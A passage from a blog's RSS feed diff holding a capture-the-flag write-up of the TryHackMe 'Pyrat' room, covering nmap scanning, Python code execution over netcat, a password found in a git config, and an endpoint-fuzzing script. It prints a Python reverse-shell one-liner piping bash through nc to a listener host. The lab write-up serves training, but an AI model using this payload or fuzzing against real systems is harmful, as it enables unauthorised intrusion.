+      &lt;figcaption class=&#34;center&#34; &gt;Lab solved&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+</content>
+    </item>
+    
+    <item>
+      <title>THM - Pyrat</title>
+      <link>//localhost:1313/posts/thm-pyrat/</link>
+      <pubDate>Wed, 09 Oct 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/posts/thm-pyrat/</guid>
+      <description>&lt;p&gt;Pyrat is an “Easy” room where we encounter a rather “unusual” python HTTP server returning a curious response. With more testing, we realise that it is vulnerable to Python code execution which gives us foothold into the box. After some exploration, we find files that help us better understand how the Python server work and with some fuzzing with a custom script we finally get root access.&lt;/p&gt;
+&lt;h2 id=&#34;nmap-results&#34;&gt;Nmap Results&lt;/h2&gt;
+&lt;hr&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT     STATE SERVICE  VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;3072&lt;/span&gt; 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-open-proxy: Proxy might be redirecting requests
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We have 2 ports open:&lt;/p&gt;</description>
+      <content>&lt;p&gt;Pyrat is an “Easy” room where we encounter a rather “unusual” python HTTP server returning a curious response. With more testing, we realise that it is vulnerable to Python code execution which gives us foothold into the box. After some exploration, we find files that help us better understand how the Python server work and with some fuzzing with a custom script we finally get root access.&lt;/p&gt;
+&lt;h2 id=&#34;nmap-results&#34;&gt;Nmap Results&lt;/h2&gt;
+&lt;hr&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT     STATE SERVICE  VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;3072&lt;/span&gt; 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-open-proxy: Proxy might be redirecting requests
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We have 2 ports open:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;22 for ssh&lt;/li&gt;
+&lt;li&gt;8000 for a Python Http server&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;python-http-server&#34;&gt;Python HTTP Server&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;When we navigate to http://10.10.167.212:8000 we get the message: “Try a more basic connection!”&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/try_more_basic.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Home Page&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Let’s try it with curl too:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl http://10.10.167.212:8000 -i
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/try_with_curl.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Using curl&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We can see in the response headers that the server is &lt;code&gt;SimpleHTTP/0.6 Python/3.11.2&lt;/code&gt; and the response body is the same as before: &amp;ldquo;Try a more basic connection.&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;Seeing this, what comes in mind is to try connecting via netcat as follows:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc 10.10.167.212 &lt;span class=&#34;m&#34;&gt;8000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With this command, we establish a connection with the server but we get nothing from it. Let’s try and see if we can run python code&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/py_code_exec.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Python Code Execution&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We can see that the server executed our code. We can now try to get a reverse shell using the following one-liner payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&amp;gt;&amp;amp;1|nc &amp;lt;LHOST&amp;gt; &amp;lt;LPORT&amp;gt; &amp;gt;/tmp/f&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;Don’t forget to replace &lt;code&gt;&amp;lt;LHOST&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;LPORT&amp;gt;&lt;/code&gt; with the IP and Port of your listener.&lt;/p&gt;&lt;/blockquote&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/rev_shell.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Reverse shell&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We got a shell back!&lt;/p&gt;
+&lt;h2 id=&#34;privesc&#34;&gt;Privesc&lt;/h2&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;www-data---think&#34;&gt;www-data -&amp;gt; think&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;After some exploration, we stumble upon an interesting folder at &lt;code&gt;/opt/dev&lt;/code&gt;. Listing the contents of this folder we see that it’s a git repository.&lt;/p&gt;
+&lt;p&gt;When we try to execute basic git commands we get an error basically saying that this repo doesn’t belong to our user:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/dubious_ownership_git.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Dubious ownership of the repository&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We can see that the user &lt;code&gt;think&lt;/code&gt; is the owner of this repo.&lt;/p&gt;
+&lt;p&gt;With further digging, we find a password inside &lt;code&gt;/opt/dev/.git/config&lt;/code&gt;:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/think_user_password.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;think&#39;s password found in /opt/dev/.git/config&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;If we try this password with ssh, we are able to login to the machine as think and get the user flag at &lt;code&gt;/home/think/user.txt&lt;/code&gt;:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/user_flag.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;User flag obtained !&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h3 id=&#34;think---root&#34;&gt;think -&amp;gt; root&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Now that we have a shell as think, let’s see what was in that git repository.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/git_status.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Running git status&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We can see that there was a file named &lt;code&gt;pyrat.py.old&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;After restoring it with &lt;code&gt;git restore pyrat.py.old&lt;/code&gt;, we get the following python script:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;...............................................&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;switch_case&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;some_endpoint&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;get_this_enpoint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;# Check socket is admin and downgrade if is not aprooved&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;uid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;change_uid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;shell&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;exec_python&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pty&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client_socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fileno&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client_socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fileno&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dup2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client_socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fileno&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;pty&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;spawn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;send_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;...............................................&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Reading the code, we see that the application will behave differently based on the data provided to it. Additionally, if we read the description of the room:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A subsequent exploration yields valuable insights into the application’s older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;We can infer that there is another endpoint ( like &lt;code&gt;shell&lt;/code&gt; ) and we are supposed to fuzz the server in order to find it.&lt;/p&gt;
+&lt;p&gt;But before that, let’s see how the server behaves when it is provided a valid endpoint vs when it is given an invalid endpoint.&lt;/p&gt;
+&lt;p&gt;For the valid endpoint, let’s just try &lt;code&gt;shell&lt;/code&gt;:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/valid_endpoint.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Trying shell&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We can see that the shell endpoint works as shown in the python code (it spawns a shell). Now for an invalid endpoint (&lt;code&gt;invalid123&lt;/code&gt;):&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/invalid_endpoint.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Trying an invalid endpoint&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We get the message: “&lt;code&gt;name ‘invalid123’ is not defined&lt;/code&gt;”.&lt;/p&gt;
+&lt;p&gt;Now we have enough information to write a script that will help us discover new endpoints.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;814765329&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;814765329&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Fuzzing for other endpoints&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
+import socket
+
+# Defining variables
+RHOST = &amp;#34;10.10.137.243&amp;#34;
+RPORT = 8000
+WORDLIST_PATH = &amp;#34;/usr/share/wordlists/dirb/common.txt&amp;#34;
+
+# Creating a socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Setting a timeout for the socket (2 seconds)
+s.settimeout(2)
+
+# Connecting to the server
+s.connect((RHOST, RPORT))
+
+# Opening the wordlist file in &amp;#34;read&amp;#34; mode
+wlist = open(WORDLIST_PATH, &amp;#34;r&amp;#34;)
+
+for endpoint in wlist:
+    print(f&amp;#34;[i] Trying {endpoint.strip()}&amp;#34;)
+    try:
+        s.sendall(endpoint.strip().encode())
+        response = s.recv(1024).decode()
+        if &amp;#34;is not defined&amp;#34; not in response and &amp;#34;&amp;lt;string&amp;gt;&amp;#34; not in response and response.strip() != &amp;#34;&amp;#34;:
+            print(f&amp;#34;[&amp;#43;] {endpoint.strip()} might be a valid endpoint. It returned: {response}&amp;#34;)
+            choice = input(&amp;#34;Continue? [y/n] -&amp;gt; &amp;#34;)
+            if choice != &amp;#34;y&amp;#34;:
+                exit(0)
+    except socket.timeout:
+        print(f&amp;#34;[!] Timeout for {endpoint.strip()}&amp;#34;)
+        continue
+
+wlist.close()
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;This script will first connect to the server with help of the socket module. Once connected, it will loop through the wordlist (defined in the &lt;code&gt;WORDLIST_PATH&lt;/code&gt; variable) and send each of the word to the server. If the response from the server fulfills the following criteria:&lt;/p&gt;
